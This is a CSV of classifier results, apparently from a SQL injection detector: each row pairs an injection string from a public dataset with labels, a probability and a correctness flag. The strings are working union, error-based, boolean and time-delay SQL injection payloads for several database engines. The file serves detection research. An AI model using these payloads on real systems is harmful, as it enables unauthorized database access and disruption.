text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
"1'   )    )    as tfub where 3461  =  3461 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,1509,1,1,0.9999867677688599,1
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'tvcm'  =  'tvcm",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
"1%""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
-5134   )    )     )   or 8571  =  8571--,sajid576/sql-injection-dataset,1523,1,1,0.9999861717224121,1
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
-2452'   )    )     )   union all select 1951--,sajid576/sql-injection-dataset,1538,1,1,0.9999861717224121,1
-9556 or   (  2049  =  6967  )  *6967# mhbc,sajid576/sql-injection-dataset,1541,1,1,0.9999862909317017,1
"select * from generate_series  (  3990,3990,case when   (  3990  =  9597  )   then 1 else 0 end  )   limit 1--",sajid576/sql-injection-dataset,1547,1,1,0.9999862909317017,1
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'opll' like 'opll",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
"1""  )   where 9499  =  9499",sajid576/sql-injection-dataset,1562,1,1,0.9999864101409912,1
"1' and elt  (  4249  =  4249,7259  )   and 'pgvz'  =  'pgvz",sajid576/sql-injection-dataset,1570,1,1,0.9999865293502808,1
"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1583,1,1,0.999985933303833,1
-8729'+  (  select 'nbzl' where 7160  =  7160 order by 1#,sajid576/sql-injection-dataset,1596,1,1,0.9999861717224121,1
"1   )    )    as ynzg where 1926  =  1926 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,1603,1,1,0.9999862909317017,1
1  )   as sdnd where 9472  =  9472,sajid576/sql-injection-dataset,1616,1,1,0.9999861717224121,1
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'lyem' like 'lyem",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",sajid576/sql-injection-dataset,1623,1,1,0.9999865293502808,1
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
"select * from generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   limit 1--",sajid576/sql-injection-dataset,1631,1,1,0.9999860525131226,1
"1'||  (  select 'jpow' from dual where 4381  =  4381 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"1""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999862909317017,1
"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",sajid576/sql-injection-dataset,1642,1,1,0.9999866485595703,1
"-5776%' union all select 3075,3075,3075,3075,3075--",sajid576/sql-injection-dataset,1657,1,1,0.9999855756759644,1
1%' and 1736  =  4220,sajid576/sql-injection-dataset,1667,1,1,0.9999860525131226,1
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,sajid576/sql-injection-dataset,1674,1,1,0.9999864101409912,1
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )",sajid576/sql-injection-dataset,1681,1,1,0.9999864101409912,1
"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",sajid576/sql-injection-dataset,1692,1,1,0.9999865293502808,1
1'+  (  select tart where 9861  =  9861,sajid576/sql-injection-dataset,1706,1,1,0.9999864101409912,1
1'   )    )    as cjjm where 1981  =  1981,sajid576/sql-injection-dataset,1718,1,1,0.9999860525131226,1
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   7805  =  7805,sajid576/sql-injection-dataset,1730,1,1,0.9999864101409912,1
"1   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4090  =  4090",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
"1'||  (  select 'dbxr' where 4014  =  4014 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1735,1,1,0.9999865293502808,1
-7279  )   or 9898  =  9963 and   (  1481  =  1481,sajid576/sql-injection-dataset,1746,1,1,0.9999864101409912,1
"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",sajid576/sql-injection-dataset,1751,1,1,0.9999862909317017,1
"-9566%""  )   union all select 7973,7973,7973,7973--",sajid576/sql-injection-dataset,1762,1,1,0.9999864101409912,1
1  )   and 8417  =  5276#,sajid576/sql-injection-dataset,1772,1,1,0.9999864101409912,1
"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1783,1,1,0.9999865293502808,1
"1%'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
"1""   )    )    as ynuw where 9138  =  9138",sajid576/sql-injection-dataset,1798,1,1,0.9999861717224121,1
select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sajid576/sql-injection-dataset,1809,1,1,0.9999865293502808,1
"-3445 union all select 5505,5505,5505--",sajid576/sql-injection-dataset,1812,1,1,0.9999847412109375,1
"-6554'   )    )     )   union all select 4384,4384,4384,4384,4384#",sajid576/sql-injection-dataset,1821,1,1,0.9999866485595703,1
1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,812,1,1,0.9999865293502808,1
1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,sajid576/sql-injection-dataset,1831,1,1,0.9999865293502808,1
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",sajid576/sql-injection-dataset,1844,1,1,0.9999865293502808,1
"1  )   where 6340  =  6340 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
"1 where 8114  =  8114 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sajid576/sql-injection-dataset,1855,1,1,0.9999861717224121,1
"1'  )   as dwgv where 1525  =  1525 union all select null,null--",sajid576/sql-injection-dataset,1869,1,1,0.9999864101409912,1
select case when 5559  =  3483 then 1 else null end--,sajid576/sql-injection-dataset,1874,1,1,0.9999853372573853,1
select pg_sleep  (  5  )   and    (    (     (  'mgbm' like 'mgbm,sajid576/sql-injection-dataset,1882,1,1,0.9999861717224121,1
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",sajid576/sql-injection-dataset,812,1,1,0.9999866485595703,1
1'  )   where 6045  =  6045,sajid576/sql-injection-dataset,1893,1,1,0.9999865293502808,1
"1%"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999861717224121,1
"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"1""   )    )    and 5421  =  4804--",sajid576/sql-injection-dataset,1904,1,1,0.9999865293502808,1
"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",sajid576/sql-injection-dataset,1917,1,1,0.9999861717224121,1
"-5160'  )   as kgjw where 9609  =  9609 union all select 9609,9609--",sajid576/sql-injection-dataset,1928,1,1,0.9999866485595703,1
"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",sajid576/sql-injection-dataset,1931,1,1,0.9999865293502808,1
select   (  case when   (  2717  =  2634  )   then 2717 else 2717*  (  select 2717 from mysql.db  )   end  )  #,sajid576/sql-injection-dataset,1937,1,1,0.9999865293502808,1
1  )   as ilqx where 8547  =  8547,sajid576/sql-injection-dataset,1950,1,1,0.9999862909317017,1
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",sajid576/sql-injection-dataset,812,1,1,0.9999866485595703,1
"1"" where 8089  =  8089",sajid576/sql-injection-dataset,1961,1,1,0.9999861717224121,1
"-5278""   )    )     )   union all select 5264,5264,5264#",sajid576/sql-injection-dataset,1971,1,1,0.9999864101409912,1
1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',sajid576/sql-injection-dataset,1982,1,1,0.9999866485595703,1
"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,276,1,1,0.9999865293502808,1
1%'   )    )     )   rlike   (  select   (  case when   (  7697  =  3334  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',sajid576/sql-injection-dataset,1994,1,1,0.9999865293502808,1
"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,379,1,1,0.9999864101409912,1
"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--",sajid576/sql-injection-dataset,2006,1,1,0.999985933303833,1
"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",sajid576/sql-injection-dataset,2015,1,1,0.9999865293502808,1
"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",sajid576/sql-injection-dataset,2018,1,1,0.9999865293502808,1
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",sajid576/sql-injection-dataset,2028,1,1,0.9999865293502808,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',sajid576/sql-injection-dataset,2038,1,1,0.9999864101409912,1
"-1573""  )   union all select 3928,3928,3928,3928--",sajid576/sql-injection-dataset,2050,1,1,0.9999862909317017,1
"1   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999861717224121,1
"1'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
select   (  case when   (  2056  =  1917  )   then 2056 else 1/  (  select 0  )   end  )  --,sajid576/sql-injection-dataset,2064,1,1,0.9999865293502808,1
-8828   )    )    as ospo where 2141  =  2141 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,sajid576/sql-injection-dataset,2074,1,1,0.9999865293502808,1
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
"iif  (  5214  =  7412,1,1/0  )",sajid576/sql-injection-dataset,2088,1,1,0.9999864101409912,1
1'  )   as rhvm where 1420  =  1420,sajid576/sql-injection-dataset,2098,1,1,0.9999864101409912,1
"1""  )   as ipxg where 4031  =  4031 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",sajid576/sql-injection-dataset,2109,1,1,0.9999866485595703,1
1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,sajid576/sql-injection-dataset,2111,1,1,0.9999865293502808,1
"1""  )   and sleep  (  5  )   and   (  ""ytof""  =  ""ytof",sajid576/sql-injection-dataset,2112,1,1,0.9999864101409912,1
"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",sajid576/sql-injection-dataset,2121,1,1,0.9999864101409912,1
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'mymg'  =  'mymg",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
"1 where 2751  =  2751 union all select null,null,null,null--",sajid576/sql-injection-dataset,2136,1,1,0.9999858140945435,1
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'yznd' like 'yznd",sajid576/sql-injection-dataset,2146,1,1,0.9999865293502808,1
"1' where 5251  =  5251 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
-7548 or 2850  =  9666,sajid576/sql-injection-dataset,2156,1,1,0.999985933303833,1
"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999862909317017,1
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,812,1,1,0.9999866485595703,1
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""%""  =  """,sajid576/sql-injection-dataset,2170,1,1,0.9999864101409912,1
"1%""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
"1  )   where 9645  =  9645 union all select null,null,null--",sajid576/sql-injection-dataset,2181,1,1,0.9999862909317017,1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,812,1,1,0.9999865293502808,1
"-7700%'  )   union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",sajid576/sql-injection-dataset,2191,1,1,0.9999865293502808,1
"1  )   as khkv where 2944  =  2944 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",sajid576/sql-injection-dataset,2197,1,1,0.999985933303833,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""khuw"" like ""khuw",sajid576/sql-injection-dataset,2207,1,1,0.9999856948852539,1
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""urqg""  =  ""urqg",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",sajid576/sql-injection-dataset,2217,1,1,0.9999860525131226,1
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'zeum'  =  'zeum",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
1' where 4473  =  4473 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,2231,1,1,0.9999865293502808,1
"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",sajid576/sql-injection-dataset,2239,1,1,0.9999856948852539,1
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'drui' like 'drui",sajid576/sql-injection-dataset,379,1,1,0.9999865293502808,1
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'vpqr'  =  'vpqr,sajid576/sql-injection-dataset,2252,1,1,0.9999865293502808,1
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'yiem'  =  'yiem",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"1%""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
1' where 3337  =  3337 and 8403  =  5760,sajid576/sql-injection-dataset,2262,1,1,0.9999862909317017,1
"1%'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
1'  )   and 7533  =  7533,sajid576/sql-injection-dataset,2266,1,1,0.9999866485595703,1
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ),sajid576/sql-injection-dataset,544,1,1,0.9999865293502808,1
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",sajid576/sql-injection-dataset,812,1,1,0.9999866485595703,1
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",sajid576/sql-injection-dataset,2274,1,1,0.9999862909317017,1
"1%'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  '%'  =  '",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,812,1,1,0.9999866485595703,1
"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",sajid576/sql-injection-dataset,2291,1,1,0.9999862909317017,1
1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,276,1,1,0.9999866485595703,1
"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999861717224121,1
"1   )    )    as jyfo where 8121  =  8121 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,2297,1,1,0.9999864101409912,1
"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
"1'  )   as cgsz where 7194  =  7194 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",sajid576/sql-injection-dataset,2313,1,1,0.9999866485595703,1
"1"" where 7005  =  7005",sajid576/sql-injection-dataset,2324,1,1,0.9999861717224121,1
1 where 9620  =  9620 waitfor delay '0:0:5'--,sajid576/sql-injection-dataset,2325,1,1,0.9999861717224121,1
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""zyoo""  =  ""zyoo",sajid576/sql-injection-dataset,379,1,1,0.9999864101409912,1
"-7142'   )    )    union all select 5083,5083,5083,5083#",sajid576/sql-injection-dataset,2340,1,1,0.9999864101409912,1
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ),sajid576/sql-injection-dataset,544,1,1,0.9999865293502808,1
"-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--",sajid576/sql-injection-dataset,2343,1,1,0.9999861717224121,1
"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999862909317017,1
-7497'  )   as kjzt where 3758  =  3758 or 4794  =  9499--,sajid576/sql-injection-dataset,2364,1,1,0.9999865293502808,1
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'mzqi'  =  'mzqi,sajid576/sql-injection-dataset,2365,1,1,0.9999864101409912,1
"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,2375,1,1,0.9999866485595703,1
-2717'   )    )     )   or 8571  =  8571--,sajid576/sql-injection-dataset,2383,1,1,0.9999862909317017,1
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'pqxe' like 'pqxe",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
-1087  )   where 5787  =  5787 union all select 5787#,sajid576/sql-injection-dataset,2402,1,1,0.9999861717224121,1
"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sajid576/sql-injection-dataset,2408,1,1,0.9999866485595703,1
"-4637"" where 8354  =  8354 or 1186  =  2714--",sajid576/sql-injection-dataset,2416,1,1,0.9999864101409912,1
